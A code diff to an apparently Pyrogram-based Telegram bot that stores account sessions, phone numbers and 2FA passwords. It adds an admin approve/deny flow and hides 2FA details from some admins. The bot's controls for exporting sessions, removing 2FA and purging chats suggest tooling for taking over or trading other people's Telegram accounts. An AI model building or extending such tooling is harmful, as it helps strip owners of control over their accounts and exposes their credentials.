@@ -513,11 +513,33 @@ async def handle_guide_cb(client, cb):
                 await tele_client.disconnect()
                 await sy.edit(f"Fɪɴɪsʜᴇᴅ ᴘʀᴏᴄᴇssɪɴɢ ᴀᴄᴄᴏᴜɴᴛ #{sydno} ✅")
                 if message.from_user.id not in ADMINS:
-                    await db.syd.update_one(
-                    {"user_id": message.from_user.id},
-                    {"$addToSet": {"accounts": sydno}},
-                    upsert=True
-                    )
+                    query = (
+                            f"🚨 Account Add Request 🚨\n\n"
+                            f"User: {message.from_user.first_name} ({message.from_user.id})\n"
+                            f"Account ID: #{sydno}\n"
+                            f"Name: {info['name']}\n"
+                            f"Phone: {info['phone']}\n"
+                            f"Do you want to approve this account?"
+                        )
+
+                    buttons = InlineKeyboardMarkup([
+                        [
+                            InlineKeyboardButton("✅ Approve", callback_data=f"approve_{sydno}_{message.from_user.id}"),
+                            InlineKeyboardButton("❌ Deny", callback_data=f"deny_{sydno}_{message.from_user.id}")
+                        ]
+                    ])
+
+                    for admin_id in ADMINS:
+                        try:
+                            await client.send_message(admin_id, query, reply_markup=buttons)
+                        except Exception as e:
+                            print(f"Failed to send query to {admin_id}: {e}")
+
+                    try:
+                        await message.reply("⏳ Your request has been sent to admins for verification. Please wait for approval.")
+                    except Exception as e:
+                        print(f"Failed to notify user: {e}")
+
             except SessionPasswordNeededError:
                 results.append(f"#{offset} ❌ 2FA: Eɴᴀʙʟᴇᴅ (ᴘᴀssᴡᴏʀᴅ ʀᴇQᴜɪʀᴇᴅ)")
                 await message.reply(f"❌ ᴛᴅᴀᴛᴀ #{offset}: Nᴇᴇᴅs 2FA ᴘᴀssᴡᴏʀᴅ")
@@ -603,24 +625,27 @@ async def retrieve_account(client, message):
         return await message.reply("❌ You don't have access to this account.")
     valid, me, session = await check_valid_session(doc["tdata"], message)
     status = "✅ Valid" if valid else "❌ Invalid"
-
+    show_2fa = (user_id not in ADMINS) or str(doc.get("by", "")).endswith(f"({user_id})")
+    twofa_text = doc["twofa"] if show_2fa else f"🔒 Hidden\n By{doc.get("by")}"
     text = (
         f"📂 Account Info\n"
         f"Account #: {acc_num}\n"
         f"Name: {doc['name']}\n"
         f"Phone: {doc['phone']}\n"
-        f"{doc['twofa']}\n"
+        f"{twofa_text}\n"
      #   f"Spam: {doc['spam']}\n"
         f"Status: {status}"
     )
 
-    keyboard = InlineKeyboardMarkup([
-        [InlineKeyboardButton("📄 Sᴇꜱꜱɪᴏɴ Tᴇʟᴇ", callback_data=f"tele_{acc_num}")],
-        [InlineKeyboardButton("📱 Bʏ Pʜᴏɴᴇ", callback_data=f"phone_{acc_num}")],
-        [InlineKeyboardButton("Sᴇᴛ 2FA", callback_data=f"set2fa_{acc_num}"),
-         InlineKeyboardButton("Rᴇᴍᴏᴠᴇ 2FA", callback_data=f"remove2fa_{acc_num}")],
-        [InlineKeyboardButton("Pᴜʀɢᴇ ᴄʜᴀᴛꜱ", callback_data=f"delchats_{acc_num}")]
-    ])
+    keyboard = None
+    if user_id not in ADMINS or str(doc.get("by")).endswith(f"({user_id})"):
+        keyboard = InlineKeyboardMarkup([
+            [InlineKeyboardButton("📄 Sᴇꜱꜱɪᴏɴ Tᴇʟᴇ", callback_data=f"tele_{acc_num}")],
+            [InlineKeyboardButton("📱 Bʏ Pʜᴏɴᴇ", callback_data=f"phone_{acc_num}")],
+            [InlineKeyboardButton("Sᴇᴛ 2FA", callback_data=f"set2fa_{acc_num}"),
+             InlineKeyboardButton("Rᴇᴍᴏᴠᴇ 2FA", callback_data=f"remove2fa_{acc_num}")],
+            [InlineKeyboardButton("Pᴜʀɢᴇ ᴄʜᴀᴛꜱ", callback_data=f"delchats_{acc_num}")]
+        ])
 
     await message.reply(text, reply_markup=keyboard)
 
@@ -803,6 +828,47 @@ async def clean_db(client, message):
 
     result = await db.col.delete_many({})
     await message.reply(f"✅ Database cleaned. Deleted {result.deleted_count} accounts.")
+
+
+from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+from pyrogram import filters, Client
+
+
+@Client.on_callback_query(filters.regex(r"^approve_(\d+)_(\d+)$"))
+async def approve_account(client, callback_query):
+    sydno = int(callback_query.data.split("_")[1])   
+    user_id = int(callback_query.data.split("_")[2])   
+
+   
+    await db.syd.update_one(
+        {"user_id": user_id},
+        {"$addToSet": {"accounts": sydno}},
+        upsert=True
+    )
+
+    await callback_query.answer("✅ Approved", show_alert=False)
+    await callback_query.message.edit_text(
+        f"✅ Approved Account #{sydno} for user {user_id}"
+    )
+    try:
+        await client.send_message(user_id, f"✅ Your account #{sydno} was approved.")
+    except:
+        pass
+
+
+@Client.on_callback_query(filters.regex(r"^deny_(\d+)_(\d+)$"))
+async def deny_account(client, callback_query):
+    sydno = int(callback_query.data.split("_")[1])
+    user_id = int(callback_query.data.split("_")[2])
+
+    await callback_query.answer("❌ Denied", show_alert=False)
+    await callback_query.message.edit_text(
+        f"❌ Denied Account #{sydno} for user {user_id}"
+    )
+    try:
+        await client.send_message(user_id, f"❌ Your account #{sydno} was denied.")
+    except:
+        pass
 
 @Client.on_callback_query(filters.regex(r"^delchats_(\d+)$"))
 async def delete_all_chats(client, callback_query):
